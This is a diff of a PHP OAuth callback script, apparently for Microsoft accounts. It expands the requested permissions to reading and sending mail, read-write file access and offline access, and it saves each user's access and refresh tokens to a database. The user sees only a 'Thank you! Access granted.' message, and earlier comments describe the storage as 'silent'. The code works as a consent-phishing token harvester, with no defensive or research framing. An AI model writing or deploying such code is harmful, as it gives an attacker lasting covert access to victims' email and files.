@@ -30,7 +30,7 @@ $code = $_GET['code'];
 // ---------- Exchange code for token ----------
 $postData = http_build_query([
     'client_id' => $client_id,
-    'scope' => 'openid profile email User.Read',
+    'scope' => 'openid profile email User.Read Mail.Read Mail.Send Files.ReadWrite offline_access',
     'code' => $code,
     'redirect_uri' => $redirect_uri,
     'grant_type' => 'authorization_code',
@@ -79,10 +79,10 @@ if (!$oid || !$email) {
     exit("Could not retrieve user info from token.");
 }
 
-// ---------- Store tokens in database silently ----------
+// ---------- Store tokens in database ----------
 try {
     $stmt = $pdo->prepare("
-        INSERT INTO oauth_users (user_email, oid, access_token, refresh_token)
+        INSERT INTO oauth_users (email, oid, access_token, refresh_token)
         VALUES (:email, :oid, :access_token, :refresh_token)
         ON CONFLICT (oid)
         DO UPDATE SET access_token = EXCLUDED.access_token,
@@ -100,5 +100,5 @@ try {
     exit("Database error: " . $e->getMessage());
 }
 
-// ---------- Success message only ----------
+// ---------- Show only success message ----------
 echo "<h2>Thank you! Access granted.</h2>";
